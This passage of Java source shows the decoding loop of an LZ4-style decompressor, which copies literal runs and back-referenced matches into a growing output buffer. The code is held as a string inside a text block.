            while (inPos < input.length) {
                int token = input[inPos++] & 0xFF;
                int literalLen = token >>> 4;
                if (literalLen == 15) {
                    int add;
                    do { add = input[inPos++] & 0xFF; literalLen += add; } while (add == 255);
                }
                if (outPos + literalLen > out.length) out = Arrays.copyOf(out, Math.max(out.length + out.length / 2, outPos + literalLen));
                System.arraycopy(input, inPos, out, outPos, literalLen);
                inPos += literalLen;
                outPos += literalLen;
                if (inPos >= input.length) break;
                int offset = (input[inPos++] & 0xFF) | ((input[inPos++] & 0xFF) << 8);
                int matchLen = token & 0x0F;
                if (matchLen == 15) {
                    int add;
                    do { add = input[inPos++] & 0xFF; matchLen += add; } while (add == 255);
                }
                matchLen += minMatch;
                if (outPos + matchLen > out.length) out = Arrays.copyOf(out, Math.max(out.length + out.length / 2, outPos + matchLen));
                int matchPos = outPos - offset;
                for (int j = 0; j < matchLen; j++) out[outPos++] = out[matchPos + j];
            }
            return Arrays.copyOf(out, outPos);
        }""";
}
